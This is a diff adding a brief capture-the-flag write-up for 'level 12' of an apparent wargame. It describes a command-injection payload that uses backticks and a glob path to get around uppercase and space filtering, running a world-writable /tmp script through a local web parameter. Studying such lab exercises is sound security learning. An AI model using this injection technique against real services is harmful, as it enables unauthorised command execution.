@@ -1,0 +1,17 @@
+##LEVEL 12
+
+The file is a script that is listening on 4646 port. We can go to the address.
+We also see 2 regex in the script, one is replacing the lowercase by uppercase, the other one trim the spaces.
+
+Knowing that, we cannot just pass a parameter that is launching the getflag command and redirecting to another file.
+The script is showing an "x" argument, so we assume that its possible to use it in way to execute a file.
+
+We create a script :
+touch /tmp/YOLO
+chmod 777 /tmp/YOLO
+
+#!/bin/sh
+/bin/getflag > /tmp/result
+
+Then, we can go to the URL and pass the file as the x parameter : localhost:4646?x="`/*/YOLO`"
+Now we can `cat /tmp/result` and notice we got the flag.
